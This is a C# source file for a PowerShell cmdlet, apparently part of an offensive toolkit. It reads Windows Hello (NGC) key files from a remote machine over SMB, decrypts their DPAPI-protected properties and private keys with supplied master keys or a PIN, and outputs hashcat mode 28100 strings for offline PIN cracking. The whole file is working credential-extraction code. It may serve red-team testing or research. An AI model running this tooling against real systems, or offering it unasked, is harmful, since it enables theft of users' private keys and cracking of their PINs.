using System;
using System.Buffers.Binary;
using System.Collections.Generic;
using System.Linq;
using System.Management.Automation;
using System.Net;
using System.Security;
using System.Text;
using System.Threading;
using Titanis;
using Titanis.Net;
using Titanis.Smb2;
using Titanis.Winterop;
using Titanis.Winterop.Security;
using Winterop = Titanis.Winterop;

namespace Titanis.Tbo.Smb2.PowerShell
{
	public sealed class TboNgcCryptoKeyInfo
	{
		public string ServerName { get; init; } = string.Empty;
		public string ShareName { get; init; } = string.Empty;
		public string CryptoKeysRootPath { get; init; } = string.Empty;

		public string CryptoKeyFileName { get; init; } = string.Empty;
		public string CryptoKeyPath { get; init; } = string.Empty;
		public string? CryptoKeyGuid { get; init; }

		public string? NgcGuid { get; init; }
		public string? UserSid { get; init; }
		public string? KeyStorageProviderGuid1 { get; init; }
		public string? KeyStorageProviderGuid2 { get; init; }
		public int? InputDataLength { get; init; }
		public string? InputDataHex { get; init; }
		public string? MatchType { get; init; }

		public string? PrivateKeyPropertiesMasterKeyGuid { get; init; }
		public bool PrivateKeyPropertiesDecrypted { get; init; }
		public string? Pbkdf2SaltHex { get; init; }
		public int? Pbkdf2Rounds { get; init; }
		public string? PrivateKeyPropertiesFailureReason { get; init; }

		public string? PrivateKeyMasterKeyGuid { get; init; }
		public string? PrivateKeyCryptAlgorithm { get; init; }
		public string? PrivateKeyHashAlgorithm { get; init; }
		public bool PrivateKeyDecrypted { get; init; }
		public string? PrivateKeyCleartextHex { get; init; }
		public string? PrivateKeyFailureReason { get; init; }

		public string? Hashcat28100 { get; init; }

		public string? FailureReason { get; init; }
	}

	internal static class NgcCryptoKeysHelpers
	{
		internal const string DefaultCryptoKeysRelativePath = @"Windows\ServiceProfiles\LocalService\AppData\Roaming\Microsoft\Crypto\Keys";

		internal const string PrivateKeyPropertiesEntropyString = "6jnkd5J3ZdQDtrsu";

		internal const string Pbkdf2SaltPropertyName = "NgcSoftwareKeyPbkdf2Salt";
		internal const string Pbkdf2RoundsPropertyName = "NgcSoftwareKeyPbkdf2Round";

		internal static string NormalizeServerName(string? serverName)
			=> DpapiHelpers.NormalizeServerName(serverName);

		internal static string NormalizeShareName(string? shareName)
			=> DpapiHelpers.NormalizeShareName(shareName);

		internal static bool IsMissingPath(NtstatusException ex)
		{
			return ex.StatusCode is Ntstatus.STATUS_OBJECT_NAME_NOT_FOUND
				or Ntstatus.STATUS_OBJECT_PATH_NOT_FOUND
				or Ntstatus.STATUS_OBJECT_NAME_INVALID;
		}

		internal static bool IsAccessDenied(NtstatusException ex)
		{
			return ex.StatusCode is Ntstatus.STATUS_ACCESS_DENIED
				or Ntstatus.STATUS_PRIVILEGE_NOT_HELD;
		}

		internal static byte[] GetPrivateKeyPropertiesEntropy()
		{
			var bytes = Encoding.UTF8.GetBytes(PrivateKeyPropertiesEntropyString);
			var entropy = new byte[bytes.Length + 1];
			Buffer.BlockCopy(bytes, 0, entropy, 0, bytes.Length);
			return entropy;
		}

		internal static string? NormalizeGuidString(string? value)
		{
			if (string.IsNullOrWhiteSpace(value))
				return null;

			var trimmed = value.Trim().Trim('\0');
			if (Guid.TryParse(trimmed, out var guid))
				return guid.ToString();

			return null;
		}

		internal static bool TryExtractCngKeyParts(
			ReadOnlySpan<byte> fileBytes,
			out string? uniqueName,
			out ReadOnlyMemory<byte> privatePropertiesBlock,
			out ReadOnlyMemory<byte> privateKeyBlock,
			out string? failureReason)
		{
			uniqueName = null;
			privatePropertiesBlock = default;
			privateKeyBlock = default;
			failureReason = null;

			if (fileBytes.IsEmpty)
			{
				failureReason = "Key file was empty.";
				return false;
			}

			// CNG key file header parsing adapted from MachineCertificateHelpers.TryExtractCngDpapiBlob,
			// with an additional slice for the private properties block.
			try
			{
				if (fileBytes.Length < 56)
				{
					failureReason = "Key file is truncated.";
					return false;
				}

				int offset = 0;
				_ = BinaryPrimitives.ReadUInt32LittleEndian(fileBytes.Slice(offset, 4));
				offset += 8; // version + unk0

				uint descrLen = BinaryPrimitives.ReadUInt32LittleEndian(fileBytes.Slice(offset, 4));
				offset += 4;

				_ = BinaryPrimitives.ReadUInt32LittleEndian(fileBytes.Slice(offset, 4)); // type
				offset += 4;

				uint publicPropsLen = BinaryPrimitives.ReadUInt32LittleEndian(fileBytes.Slice(offset, 4));
				offset += 4;

				uint privatePropsLen = BinaryPrimitives.ReadUInt32LittleEndian(fileBytes.Slice(offset, 4));
				offset += 4;

				uint privateKeyLen = BinaryPrimitives.ReadUInt32LittleEndian(fileBytes.Slice(offset, 4));
				offset += 4;

				offset += 16; // unkArray[16]

				// Some key files have an extra 4-byte field here; others do not.
				int[] descriptionOffsets = new[] { offset + 4, offset };

				foreach (var descOffset in descriptionOffsets)
				{
					int pos = descOffset;

					if (descrLen > int.MaxValue || fileBytes.Length - pos < (int)descrLen)
						continue;

					var descrBytes = fileBytes.Slice(pos, (int)descrLen).ToArray();
					var name = Encoding.Unicode.GetString(descrBytes).TrimEnd('\0');
					pos += (int)descrLen;

					if (publicPropsLen > int.MaxValue || privatePropsLen > int.MaxValue || privateKeyLen > int.MaxValue)
						continue;

					int pubLen = (int)publicPropsLen;
					int privPropLen = (int)privatePropsLen;
					int privKeyLen = (int)privateKeyLen;

					if (fileBytes.Length - pos < pubLen + privPropLen + privKeyLen)
						continue;

					pos += pubLen;

					var privProps = fileBytes.Slice(pos, privPropLen).ToArray();
					pos += privPropLen;

					var privKey = fileBytes.Slice(pos, privKeyLen).ToArray();

					uniqueName = string.IsNullOrWhiteSpace(name) ? null : name;
					privatePropertiesBlock = privProps;
					privateKeyBlock = privKey;
					return true;
				}

				failureReason = "Key file header did not match expected CNG format.";
				return false;
			}
			catch (Exception ex)
			{
				failureReason = $"Failed to parse key file: {ex.Message}";
				return false;
			}
		}

		internal static bool TryParseDpapiBlob(ReadOnlySpan<byte> blobBytes, out DpapiBlob blob, out string? failureReason)
		{
			blob = null!;
			failureReason = null;

			var offset = DpapiHelpers.FindMagicOffset(blobBytes);
			if (offset < 0)
			{
				failureReason = "DPAPI magic header not found.";
				return false;
			}

			try
			{
				blob = DpapiBlob.Parse(blobBytes, offset);
				return true;
			}
			catch (Exception ex)
			{
				failureReason = $"Failed to parse DPAPI blob: {ex.Message}";
				return false;
			}
		}

		internal sealed class NgcPrivateKeyProperty
		{
			public string Name { get; init; } = string.Empty;
			public byte[] Value { get; init; } = Array.Empty<byte>();
		}

		internal static IReadOnlyList<NgcPrivateKeyProperty> ParsePrivateKeyProperties(ReadOnlySpan<byte> data, out string? failureReason)
		{
			failureReason = null;

			if (data.IsEmpty)
				return Array.Empty<NgcPrivateKeyProperty>();

			var results = new List<NgcPrivateKeyProperty>();
			int offset = 0;
			while (offset < data.Length)
			{
				if (data.Length - offset < 4)
				{
					failureReason = "Property list is truncated (missing size).";
					return results;
				}

				uint structSize = BinaryPrimitives.ReadUInt32LittleEndian(data.Slice(offset, 4));
				if (structSize == 0)
					break;
				if (structSize > int.MaxValue || data.Length - offset < (int)structSize)
				{
					failureReason = "Property list contains an invalid entry size.";
					return results;
				}

				var prop = data.Slice(offset, (int)structSize);
				offset += (int)structSize;

				if (prop.Length < 20)
				{
					failureReason = "Property entry is truncated.";
					return results;
				}

				int pos = 0;
				_ = BinaryPrimitives.ReadUInt32LittleEndian(prop.Slice(pos, 4)); // size
				pos += 4;
				_ = BinaryPrimitives.ReadUInt32LittleEndian(prop.Slice(pos, 4)); // type
				pos += 4;
				_ = BinaryPrimitives.ReadUInt32LittleEndian(prop.Slice(pos, 4)); // unk
				pos += 4;
				uint nameLen = BinaryPrimitives.ReadUInt32LittleEndian(prop.Slice(pos, 4));
				pos += 4;
				uint valueLen = BinaryPrimitives.ReadUInt32LittleEndian(prop.Slice(pos, 4));
				pos += 4;

				if (nameLen > int.MaxValue || valueLen > int.MaxValue)
				{
					failureReason = "Property entry contains invalid lengths.";
					return results;
				}

				int nlen = (int)nameLen;
				int vlen = (int)valueLen;

				if (prop.Length - pos < nlen + vlen)
				{
					failureReason = "Property entry is truncated (name/value).";
					return results;
				}

				var nameBytes = prop.Slice(pos, nlen).ToArray();
				pos += nlen;
				var valueBytes = prop.Slice(pos, vlen).ToArray();

				var name = Encoding.Unicode.GetString(nameBytes).TrimEnd('\0');
				if (string.IsNullOrWhiteSpace(name))
					continue;

				results.Add(new NgcPrivateKeyProperty
				{
					Name = name,
					Value = valueBytes
				});
			}

			return results;
		}

		internal static bool TryExtractPbkdf2Parameters(
			IEnumerable<NgcPrivateKeyProperty> properties,
			out byte[]? saltBytes,
			out string? saltHex,
			out int? rounds)
		{
			saltBytes = null;
			saltHex = null;
			rounds = null;

			if (properties == null)
				return false;

			foreach (var prop in properties)
			{
				if (prop == null)
					continue;

				if (prop.Name.Equals(Pbkdf2SaltPropertyName, StringComparison.OrdinalIgnoreCase))
				{
					if (prop.Value != null && prop.Value.Length > 0)
					{
						saltBytes = prop.Value;
						saltHex = prop.Value.ToHexString();
					}
					else
					{
						saltBytes = null;
						saltHex = null;
					}
				}
				else if (prop.Name.Equals(Pbkdf2RoundsPropertyName, StringComparison.OrdinalIgnoreCase))
				{
					if (prop.Value != null && prop.Value.Length >= 4)
						rounds = BinaryPrimitives.ReadInt32LittleEndian(prop.Value.AsSpan(0, 4));
				}
			}

			return saltBytes != null && saltBytes.Length > 0 && rounds.HasValue && rounds.Value > 0;
		}
	}

	internal static class NgcCryptoKeysLocator
	{
		private sealed class NgcMatch
		{
			public TboNgcInfo Ngc { get; init; } = null!;
			public string MatchType { get; init; } = string.Empty;
		}

		internal static IEnumerable<TboNgcCryptoKeyInfo> Enumerate(
			ISmbProviderInfo smb,
			string serverName,
			string shareName,
			string? snapshot,
			string cryptoKeysRelativePath,
			IReadOnlyDictionary<Guid, byte[]> masterKeySet,
			bool includeAllKeys,
			bool includeHashcat,
			bool tryDecryptPrivateKey,
			string? pin,
			IReadOnlyList<string> keyGuidFilters,
			Action<string> writeVerbose,
			Action<string> writeWarning,
			Action<string, Exception> logException,
			CancellationToken cancellationToken)
		{
			var fileSystem = SmbFileSystemResolver.Resolve(smb);

			var normalizedFilters = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
			foreach (var filter in keyGuidFilters)
			{
				var normalized = NgcCryptoKeysHelpers.NormalizeGuidString(filter);
				if (!string.IsNullOrWhiteSpace(normalized))
					normalizedFilters.Add(normalized);
			}

			var ngcMatches = new Dictionary<string, List<NgcMatch>>(StringComparer.OrdinalIgnoreCase);
			void AddNgcMatch(TboNgcInfo ngc, string? keyGuid, string matchType)
			{
				var normalized = NgcCryptoKeysHelpers.NormalizeGuidString(keyGuid);
				if (string.IsNullOrWhiteSpace(normalized))
					return;

				if (!ngcMatches.TryGetValue(normalized, out var list))
				{
					list = new List<NgcMatch>();
					ngcMatches[normalized] = list;
				}

				list.Add(new NgcMatch { Ngc = ngc, MatchType = matchType });
			}

			// Best-effort NGC enumeration: if it fails, we can still enumerate Crypto\Keys using -IncludeAllKeys or -KeyGuid.
			try
			{
				foreach (var ngc in NgcLocator.Enumerate(
					smb,
					serverName,
					shareName,
					snapshot,
					includeProtectors: false,
					includeItems: false,
					includeProtectorData: true,
					writeVerbose,
					writeWarning,
					logException,
					cancellationToken))
				{
					if (ngc == null)
						continue;

					AddNgcMatch(ngc, ngc.KeyStorageProviderGuid1, matchType: "Guid1");
					AddNgcMatch(ngc, ngc.KeyStorageProviderGuid2, matchType: "Guid2");
				}
			}
			catch (Exception ex)
			{
				writeVerbose($"Get-TBONGCCryptoKeys failed to enumerate NGC containers: {ex.Message}");
			}

			if (!includeAllKeys && ngcMatches.Count == 0 && normalizedFilters.Count == 0)
			{
				writeVerbose("Get-TBONGCCryptoKeys did not find any NGC GUID mappings (and -IncludeAllKeys/-KeyGuid were not specified).");
				yield break;
			}

			var rootRel = NgcHelpers.PrefixSnapshot(snapshot, cryptoKeysRelativePath, "Snapshot");
			var root = new UncPath(serverName, shareName, rootRel);

			ISmbDirectory? rootDir = null;
			try
			{
				rootDir = fileSystem.OpenDirectory(root, cancellationToken);
			}
			catch (NtstatusException ex) when (NgcCryptoKeysHelpers.IsMissingPath(ex))
			{
				writeVerbose($"Get-TBONGCCryptoKeys could not open {root}: {ex.StatusCode}.");
			}
			catch (NtstatusException ex) when (NgcCryptoKeysHelpers.IsAccessDenied(ex))
			{
				writeWarning($"Get-TBONGCCryptoKeys was denied access to {root}: {ex.StatusCode}.");
			}
			catch (Exception ex)
			{
				logException($"Get-TBONGCCryptoKeys failed to open {root}", ex);
			}

			if (rootDir == null)
				yield break;

			var propsEntropy = NgcCryptoKeysHelpers.GetPrivateKeyPropertiesEntropy();
			var cngEntropy = MachineCertificateHelpers.GetCngEntropy();

			using (rootDir)
			{
				foreach (var entry in rootDir.QueryEntries("*", Smb2Directory.Smb2DirQueryOptions.None, SecurityInfo.None, Smb2Directory.DefaultQueryBufferSize, cancellationToken))
				{
					cancellationToken.ThrowIfCancellationRequested();

					if (string.IsNullOrWhiteSpace(entry.FileName))
						continue;
					if (entry.FileName is "." or "..")
						continue;

					bool isDirectory = (entry.FileAttributes & Winterop.FileAttributes.Directory) != 0;
					bool isReparse = (entry.FileAttributes & Winterop.FileAttributes.ReparsePoint) != 0;
					if (isDirectory || isReparse)
						continue;

					var filePath = root.Append(entry.FileName);

					byte[] fileBytes = Array.Empty<byte>();
					TboNgcCryptoKeyInfo? readFailure = null;
					try
					{
						fileBytes = DpapiHelpers.ReadFileBytes(smb, filePath, cancellationToken);
					}
					catch (Exception ex)
					{
						if (!includeAllKeys && normalizedFilters.Count == 0)
						{
							writeVerbose($"Get-TBONGCCryptoKeys could not read {filePath}: {ex.Message}");
							continue;
						}

						readFailure = new TboNgcCryptoKeyInfo
						{
							ServerName = serverName,
							ShareName = shareName,
							CryptoKeysRootPath = root.ToString(),
							CryptoKeyFileName = entry.FileName,
							CryptoKeyPath = filePath.ToString(),
							FailureReason = $"Failed to read key file: {ex.Message}"
						};
					}

					if (readFailure != null)
					{
						yield return readFailure;
						continue;
					}

					if (!NgcCryptoKeysHelpers.TryExtractCngKeyParts(
						fileBytes,
						out var uniqueName,
						out var privatePropsBlock,
						out var privateKeyBlock,
						out var keyParseFailure))
					{
						if (!includeAllKeys && normalizedFilters.Count == 0)
						{
							writeVerbose($"Get-TBONGCCryptoKeys failed to parse {filePath}: {keyParseFailure}");
							continue;
						}

						yield return new TboNgcCryptoKeyInfo
						{
							ServerName = serverName,
							ShareName = shareName,
							CryptoKeysRootPath = root.ToString(),
							CryptoKeyFileName = entry.FileName,
							CryptoKeyPath = filePath.ToString(),
							CryptoKeyGuid = uniqueName,
							FailureReason = keyParseFailure
						};
						continue;
					}

					var normalizedGuid = NgcCryptoKeysHelpers.NormalizeGuidString(uniqueName);
					if (normalizedGuid == null)
					{
						if (!includeAllKeys)
							continue;
					}

					if (normalizedFilters.Count > 0)
					{
						if (normalizedGuid == null || !normalizedFilters.Contains(normalizedGuid))
							continue;
					}

					bool hasNgcMatch = normalizedGuid != null && ngcMatches.ContainsKey(normalizedGuid);
					bool matchedFilter = normalizedFilters.Count > 0;
					if (!includeAllKeys && !hasNgcMatch && !matchedFilter)
						continue;

					// Parse + decrypt private key properties.
					string? propsMasterKeyGuid = null;
					bool propsDecrypted = false;
					byte[]? pbkdf2SaltBytes = null;
					string? saltHex = null;
					int? rounds = null;
					string? propsFailure = null;

					if (!NgcCryptoKeysHelpers.TryParseDpapiBlob(privatePropsBlock.Span, out var propsBlob, out var propsBlobFailure))
					{
						propsFailure = propsBlobFailure;
					}
					else
					{
						propsMasterKeyGuid = propsBlob.GuidMasterKey.ToString();

						if (!masterKeySet.TryGetValue(propsBlob.GuidMasterKey, out var propsKey) || propsKey == null || propsKey.Length == 0)
						{
							propsFailure = $"Master key {propsBlob.GuidMasterKey} was not found in the supplied key set.";
						}
						else
						{
							var decryptedProps = DpapiBlobCrypto.Decrypt(propsBlob, propsKey, propsEntropy);
							if (!decryptedProps.Success || decryptedProps.Cleartext == null || decryptedProps.Cleartext.Length == 0)
							{
								propsFailure = decryptedProps.FailureReason ?? "DPAPI decrypt failed.";
							}
							else
							{
								propsDecrypted = true;
								var parsedProps = NgcCryptoKeysHelpers.ParsePrivateKeyProperties(decryptedProps.Cleartext, out var propParseFailure);
								if (!string.IsNullOrWhiteSpace(propParseFailure))
								{
									propsFailure = propParseFailure;
								}
								else
								{
									NgcCryptoKeysHelpers.TryExtractPbkdf2Parameters(parsedProps, out pbkdf2SaltBytes, out saltHex, out rounds);
								}
							}
						}
					}

					// Parse private key DPAPI blob (may require PIN, so decryption is optional).
					string? keyMasterKeyGuid = null;
					string? keyCryptAlgorithm = null;
					string? keyHashAlgorithm = null;
					bool keyDecrypted = false;
					string? keyCleartextHex = null;
					string? keyFailure = null;
					string? hashcat = null;

					DpapiBlob? keyBlob = null;
					if (!NgcCryptoKeysHelpers.TryParseDpapiBlob(privateKeyBlock.Span, out var parsedKeyBlob, out var keyBlobFailure))
					{
						keyFailure = keyBlobFailure;
					}
					else
					{
						keyBlob = parsedKeyBlob;
						keyMasterKeyGuid = parsedKeyBlob.GuidMasterKey.ToString();
						keyCryptAlgorithm = DpapiBlobCrypto.ResolveCipherAlgorithmName(parsedKeyBlob.CryptAlgorithm, parsedKeyBlob.CryptAlgorithmLength);
						keyHashAlgorithm = DpapiBlobCrypto.ResolveHashAlgorithmName(parsedKeyBlob.HashAlgorithm, parsedKeyBlob.HashAlgorithmLength);

						if (masterKeySet.TryGetValue(parsedKeyBlob.GuidMasterKey, out var keyMasterKeyBytes) && keyMasterKeyBytes != null && keyMasterKeyBytes.Length > 0)
						{
							if (includeHashcat && rounds.HasValue && !string.IsNullOrWhiteSpace(saltHex))
							{
								hashcat = BuildHashcat28100(
									keyHashAlgorithm ?? "UNKNOWN",
									rounds.Value,
									saltHex!,
									parsedKeyBlob,
									keyMasterKeyBytes,
									cngEntropy);
							}

							if (tryDecryptPrivateKey)
							{
								var decryptedKey = DpapiBlobCrypto.Decrypt(parsedKeyBlob, keyMasterKeyBytes, cngEntropy);
								if (decryptedKey.Success && decryptedKey.Cleartext != null && decryptedKey.Cleartext.Length > 0)
								{
									keyDecrypted = true;
									keyCleartextHex = decryptedKey.Cleartext.ToHexString();
								}
								else if (!string.IsNullOrWhiteSpace(pin) && pbkdf2SaltBytes != null && pbkdf2SaltBytes.Length > 0 && rounds.HasValue && rounds.Value > 0)
								{
									if (NgcPinCrypto.TryDecryptDpapiBlobWithPin(
										parsedKeyBlob,
										keyMasterKeyBytes,
										cngEntropy,
										pin!,
										pbkdf2SaltBytes,
										rounds.Value,
										out var pinClear,
										out var pinFailure))
									{
										keyDecrypted = true;
										keyCleartextHex = pinClear.ToHexString();
									}
									else
									{
										keyFailure = pinFailure ?? decryptedKey.FailureReason ?? "DPAPI decrypt failed.";
									}
								}
								else
								{
									keyFailure = decryptedKey.FailureReason ?? "DPAPI decrypt failed.";
									if (!string.IsNullOrWhiteSpace(pin) && (pbkdf2SaltBytes == null || pbkdf2SaltBytes.Length == 0 || !rounds.HasValue || rounds.Value <= 0))
									{
										keyFailure += " (PIN was supplied but PBKDF2 salt/rounds were not available from private key properties.)";
									}
								}
							}
						}
						else
						{
							keyFailure = $"Master key {parsedKeyBlob.GuidMasterKey} was not found in the supplied key set.";
						}
					}

					if (!hasNgcMatch || normalizedGuid == null)
					{
						yield return new TboNgcCryptoKeyInfo
						{
							ServerName = serverName,
							ShareName = shareName,
							CryptoKeysRootPath = root.ToString(),
							CryptoKeyFileName = entry.FileName,
							CryptoKeyPath = filePath.ToString(),
							CryptoKeyGuid = uniqueName,
							MatchType = normalizedFilters.Count > 0 ? "KeyGuid" : null,
							PrivateKeyPropertiesMasterKeyGuid = propsMasterKeyGuid,
							PrivateKeyPropertiesDecrypted = propsDecrypted,
							Pbkdf2SaltHex = saltHex,
							Pbkdf2Rounds = rounds,
							PrivateKeyPropertiesFailureReason = propsFailure,
							PrivateKeyMasterKeyGuid = keyMasterKeyGuid,
							PrivateKeyCryptAlgorithm = keyCryptAlgorithm,
							PrivateKeyHashAlgorithm = keyHashAlgorithm,
							PrivateKeyDecrypted = keyDecrypted,
							PrivateKeyCleartextHex = keyCleartextHex,
							PrivateKeyFailureReason = keyFailure,
							Hashcat28100 = hashcat
						};
						continue;
					}

					foreach (var match in ngcMatches[normalizedGuid])
					{
						var ngc = match.Ngc;
						yield return new TboNgcCryptoKeyInfo
						{
							ServerName = serverName,
							ShareName = shareName,
							CryptoKeysRootPath = root.ToString(),
							CryptoKeyFileName = entry.FileName,
							CryptoKeyPath = filePath.ToString(),
							CryptoKeyGuid = uniqueName,
							NgcGuid = ngc.NgcGuid,
							UserSid = ngc.UserSid,
							KeyStorageProviderGuid1 = ngc.KeyStorageProviderGuid1,
							KeyStorageProviderGuid2 = ngc.KeyStorageProviderGuid2,
							InputDataLength = ngc.InputDataLength,
							InputDataHex = ngc.InputDataHex,
							MatchType = match.MatchType,
							PrivateKeyPropertiesMasterKeyGuid = propsMasterKeyGuid,
							PrivateKeyPropertiesDecrypted = propsDecrypted,
							Pbkdf2SaltHex = saltHex,
							Pbkdf2Rounds = rounds,
							PrivateKeyPropertiesFailureReason = propsFailure,
							PrivateKeyMasterKeyGuid = keyMasterKeyGuid,
							PrivateKeyCryptAlgorithm = keyCryptAlgorithm,
							PrivateKeyHashAlgorithm = keyHashAlgorithm,
							PrivateKeyDecrypted = keyDecrypted,
							PrivateKeyCleartextHex = keyCleartextHex,
							PrivateKeyFailureReason = keyFailure,
							Hashcat28100 = hashcat
						};
					}
				}
			}
		}

		private static string BuildHashcat28100(
			string hashAlgo,
			int rounds,
			string saltHex,
			DpapiBlob keyBlob,
			byte[] masterKeyBytes,
			byte[] entropyBytes)
		{
			var signHex = keyBlob.Sign.ToHexString();
			var mkHex = masterKeyBytes.ToHexString();
			var hmacHex = keyBlob.Hmac.ToHexString();
			var dataHex = keyBlob.Data.ToHexString();
			var entropyHex = entropyBytes.ToHexString();

			return $"$WINHELLO$*{hashAlgo.ToUpperInvariant()}*{rounds}*{saltHex}*{signHex}*{mkHex}*{hmacHex}*{dataHex}*{entropyHex}";
		}
	}

	[Cmdlet(VerbsCommon.Get, "TBONGCCryptoKeys")]
	[OutputType(typeof(TboNgcCryptoKeyInfo))]
	public sealed class GetTBONGCCryptoKeys : SmbCmdlet
	{
		[Parameter(Mandatory = true, Position = 0, ValueFromPipelineByPropertyName = true)]
		public string ServerName { get; set; } = string.Empty;

		[Parameter]
		public string ShareName { get; set; } = NgcHelpers.DefaultShareName;

		[Parameter]
		public string? Snapshot { get; set; }

		[Parameter]
		public string CryptoKeysPath { get; set; } = NgcCryptoKeysHelpers.DefaultCryptoKeysRelativePath;

		[Parameter(Mandatory = true)]
		public TboDpapiMasterKeyInfo[]? MasterKeys { get; set; }

		[Parameter]
		public SwitchParameter IncludeAllKeys { get; set; }

		[Parameter]
		public SwitchParameter IncludeHashcat { get; set; }

		[Parameter]
		public SwitchParameter TryDecryptPrivateKey { get; set; }

		[Parameter]
		public SecureString? Pin { get; set; }

		[Parameter]
		public string[]? KeyGuid { get; set; }

		private CancellationTokenSource? _cancelSource;

		protected override void ProcessRecord(ISmbProviderInfo smb)
		{
			this._cancelSource ??= new CancellationTokenSource();
			var cancellationToken = this._cancelSource.Token;

			var serverName = NgcCryptoKeysHelpers.NormalizeServerName(this.ServerName);
			if (string.IsNullOrWhiteSpace(serverName))
				throw new ArgumentException("ServerName must be provided.", nameof(this.ServerName));

			var shareName = NgcCryptoKeysHelpers.NormalizeShareName(this.ShareName);
			if (string.IsNullOrWhiteSpace(shareName))
				throw new ArgumentException("ShareName must be provided.", nameof(this.ShareName));

			var snapshot = string.IsNullOrWhiteSpace(this.Snapshot)
				? null
				: this.Snapshot.Trim();

			var masterKeySet = MachineCertificateHelpers.BuildMasterKeySet(
				this.MasterKeys,
				msg => this.LogWarning(smb, msg),
				context: "Get-TBONGCCryptoKeys");

			if (masterKeySet.Count == 0)
			{
				this.LogWarning(smb, "Get-TBONGCCryptoKeys did not receive any usable master keys (missing MasterKeyGuid or MasterKey).");
				return;
			}

			var cryptoKeysPath = string.IsNullOrWhiteSpace(this.CryptoKeysPath)
				? NgcCryptoKeysHelpers.DefaultCryptoKeysRelativePath
				: this.CryptoKeysPath.Trim().Trim('\\');

			string? pinText = null;
			if (this.Pin != null && this.Pin.Length > 0)
			{
				try
				{
					pinText = new NetworkCredential(string.Empty, this.Pin).Password;
					if (string.IsNullOrWhiteSpace(pinText))
						pinText = null;
				}
				catch (Exception ex)
				{
					this.LogWarning(smb, $"Get-TBONGCCryptoKeys failed to read PIN: {ex.Message}");
					pinText = null;
				}
			}

			var keyGuidFilters = (IReadOnlyList<string>)(this.KeyGuid?.Where(x => !string.IsNullOrWhiteSpace(x)).ToArray() ?? Array.Empty<string>());

			var results = NgcCryptoKeysLocator.Enumerate(
				smb,
				serverName,
				shareName,
				snapshot,
				cryptoKeysPath,
				masterKeySet,
				this.IncludeAllKeys.IsPresent,
				this.IncludeHashcat.IsPresent,
				this.TryDecryptPrivateKey.IsPresent,
				pinText,
				keyGuidFilters,
				message => this.LogVerbose(smb, message),
				message => this.LogWarning(smb, message),
				(context, ex) => this.LogException(smb, context, ex, emitWarning: false),
				cancellationToken);

			foreach (var result in results)
			{
				this.WriteObject(result);
			}
		}

		protected override void StopProcessing()
		{
			this._cancelSource?.Cancel();
			base.StopProcessing();
		}
	}
}
